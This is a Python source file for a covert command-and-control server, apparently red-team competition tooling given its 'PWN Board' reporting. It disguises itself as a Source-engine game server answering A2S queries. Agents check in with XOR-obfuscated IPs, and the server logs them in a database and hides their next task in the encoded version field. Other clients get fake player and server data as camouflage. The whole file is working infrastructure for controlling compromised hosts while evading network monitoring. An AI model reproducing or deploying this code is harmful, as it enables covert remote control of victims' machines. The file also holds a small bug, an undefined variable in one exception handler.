import socket
import threading
import struct
import random
import time
from base64 import b64encode, b64decode
import requests

from .config import config
from .database import Task, Agent
from .logging import log, LogLevel

PADDING = b'\x00'

class A2Sserver:
    def __init__(self, host: str, port: int):
        self.__host = host
        self.__port = port

        self.__server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.__server_socket.bind((self.__host, self.__port))

        self.key = config['key']

    def __update_pwnboard(self, ip: str) -> None:
        try:
            requests.post(config['pwnboard']['url'], json={'ip': ip, 'application': 'Source Control', 'type': 'a2s c2'}, headers={'Content-Type': 'application/json', 'Authorization': f'Bearer {config["pwnboard"]["access_token"]}'}, timeout=5)
        except:
             log(LogLevel.ERROR, f'Failed to report callback to PWN Board. Reason: {e}')

    def __xor_message(self, msg: str) -> str:
        xored = ''

        for i in range(len(msg)):
            xored += chr(ord(msg[i]) ^ ord(self.key[i % len(self.key)]))

        return(xored)

    def __make_info_response(self, bots: int, version: str) -> bytes:
        response = b'\xff\xff\xff\xff\x49' # Header

        # Protocol 
        response += b'\x11'

        # Server Name
        response += config['server']['server_name'].encode('utf-8')
        response += PADDING

        # Map name
        response += config['server']['map_name'].encode('utf-8')
        response += PADDING    

        # Folder
        response += config['server']['folder'].encode('utf-8')
        response += PADDING

        # Game
        response += config['server']['game'].encode('utf-8')
        response += PADDING

        # Game ID
        response += (int(config['server']['app_id'])).to_bytes(2, 'little')

        # Playercount
        response += (len(config['server']['players'])).to_bytes(1, 'little')


        # Max playercount
        response += (int(config['server']['max_players'])).to_bytes(1, 'little')

         # Bot count
        response += bots.to_bytes(1, 'little')
        
        # Server type
        if config['server']['dedicated'] == True:
            response += 'd'.encode('utf-8')
        else:
            response += 'l'.encode('utf-8')
        
        # Platform
        response += config['server']['platform'].encode('utf-8') 

        # Visibility
        response += b'\x00'

        # VAC
        if config['server']['vac'] == True:
            response += b'\x01'
        else:
            response += b'\x00'

        # Version
        response += b64encode(self.__xor_message(version).encode('utf-8'))
        response += PADDING

        return(response)

    def __make_player_response(self) -> bytes:
        response = b'\xff\xff\xff\xff\x44'

        # Playercount
        response += (len(config['server']['players'])).to_bytes(1, 'little')

        # Player list
        for i in range(len(config['server']['players'])):
            # Player index
            response += (i).to_bytes(1, 'little')

            # Player name
            response += config['server']['players'][i].encode('utf-8')
            response += PADDING 

            # Frags
            response += (random.randint(0, 50)).to_bytes(4, 'little')

            # Duration
            response += (random.randint(0, 1000)).to_bytes(4, 'little')

        return(response)

    def __get_agent_ip(self, msg: bytes) -> str:
        return(self.__xor_message(b64decode(msg[24:-1]).decode('utf-8')))

    def __client_handler(self, address: tuple, msg: bytes) -> None:
        log(LogLevel.INFO, f'Connection from {address[0]}:{address[1]} with message: {msg}')

        try:
            ip = self.__get_agent_ip(msg)

            if ip == '' or ip == ' ' or ip == None:
                # The client might not be a Source Control agent, send a normal response
                match msg[4]:
                    case 84: # A2S_INFO
                        self.__server_socket.sendto(self.__make_info_response(0, config['server']['version']), address)

                    case 85: # A2S_PLAYER
                        self.__server_socket.sendto(self.__make_player_response(), address)

                    case 86: # A2S_RULES
                        self.__server_socket.sendto(b'\xff\xff\xff\xff\x45\x00\x00\x00', address) # Send empty rules
                
                return

            # What type of query is this?
            match msg[4]:
                case 84: # A2S_INFO

                    # Do we already have the agent?
                    if len(Agent.select().where(Agent.ip == ip).dicts()) == 0:
                        Agent.create(ip=ip, checkins=0, last_checkin=time.time(), tasks_sent=0, tags='') # Add them

                    # Add the checkin
                    Agent.update(checkins=Agent.checkins + 1).where(Agent.ip == ip).execute()

                    # Update their last checkin
                    Agent.update(last_checkin=time.time()).where(Agent.ip == ip).execute()

                    # Get the agnet's open tasks
                    open_tasks = Task.select().where(Task.agent_ip == ip, Task.completed == 0).dicts()

                    if len(open_tasks) == 0:
                        version = config['server']['version']
                    else:
                        version = open_tasks[0]['task']
                    
                    # Send the info response
                    self.__server_socket.sendto(self.__make_info_response(len(open_tasks), version), address)

                    if len(open_tasks) != 0:
                        # Mark the task as completed
                        Task.update(completed = 1).where(Task.id == open_tasks[0]['id']).execute()

                    if config['pwnboard']['use_pwnboard'] == True:
                        self.__update_pwnboard(ip)

                case 85: # A2S_PLAYER
                    self.__server_socket.sendto(self.__make_player_response(), address)

                case 86: # A2S_RULES
                    self.__server_socket.sendto(b'\xff\xff\xff\xff\x45\x00\x00\x00', address) # Send empty rules

        except Exception as e:
            log(LogLevel.ERROR, f'Failed to create response for {address[0]}:{address[1]}. Reason: {e}')

    def start(self) -> None:
        while True:
            try:
                msg, address = self.__server_socket.recvfrom(1024)

                client = threading.Thread(target=self.__client_handler, args=(address,msg))
                client.start()
            except Exception as e:
                log(LogLevel.ERROR, f'Failed to accept to connection from {address[0]}:{address[1]}. Reason: {e}')
